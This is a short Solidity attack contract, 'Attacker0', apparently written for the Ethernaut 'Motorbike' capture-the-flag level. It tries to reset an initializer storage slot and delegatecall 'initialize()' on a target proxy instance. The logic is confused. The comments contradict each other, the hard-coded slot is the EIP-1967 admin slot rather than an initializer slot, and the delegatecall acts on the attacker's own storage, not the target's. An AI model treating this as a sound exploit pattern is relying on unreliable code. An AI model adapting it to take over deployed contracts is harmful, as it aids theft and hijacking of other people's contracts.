pragma solidity ^0.8.0;

contract Attacker0 {
    // keccak-256 hash of "Motorbike.sol:Motorbike" minus 1, but we know it's the instance address
    address public immutable instance;

    // Slot for initializer from Initializable contract
    bytes32 internal constant initializer_SLOT = 0xb53127684a568b3173ae13b9f8a046b1d8d700ecba88d7455aa5e5c02563c55b;

    constructor(address _instance) {
        instance = _instance;
    }

    function resetInitializer() public {
        assembly {
            sstore(initializer_SLOT, 0)
        }
    }

    function callInitialize() public {
        (bool success, ) = instance.delegatecall(abi.encodeWithSignature("initialize()"));
        require(success, "Initialize failed");
    }
}